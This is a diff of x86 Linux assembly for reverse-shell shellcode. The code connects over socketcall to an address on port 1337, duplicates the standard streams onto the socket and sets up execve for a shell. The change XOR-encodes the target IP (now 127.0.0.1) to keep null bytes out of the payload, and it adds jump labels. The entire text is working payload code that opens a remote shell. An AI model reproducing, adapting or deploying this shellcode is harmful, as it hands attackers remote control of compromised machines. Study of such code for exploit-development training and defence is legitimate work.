@@ -41,9 +41,11 @@ _start:
     ; socketcall
     mov al, 0x66     ; socketcall()
     mov bl, 0x3      ; SYS_CONNECT
-
+    
     ; setup sockaddr struct
-    push 0x3000A8C0    ; 48.0.168.192
+    push 0xfeffff80                 ; 1.0.0.127
+    xor dword [esp], 0xffffffff     ; xor IP with key 0xff to get real ip
+
     push word 0x3905        ; htons(1337)
     push word 0x2           ; AF_INET
 
@@ -57,6 +59,7 @@ _start:
     mov ecx, esp     ; Second parameter for socketcall, points to arguments required by connect()
     int 0x80         ; Tell the kernel let's go!
 
+redirect:
     ; --------------------
     ; # Setup dup2
     ; redirect to stdin
@@ -75,6 +78,7 @@ _start:
     mov cl, 0x2      ; STDERR
     int 0x80
 
+shell:
     ; --------------------
     ; # Setup execv
     xor edx, edx
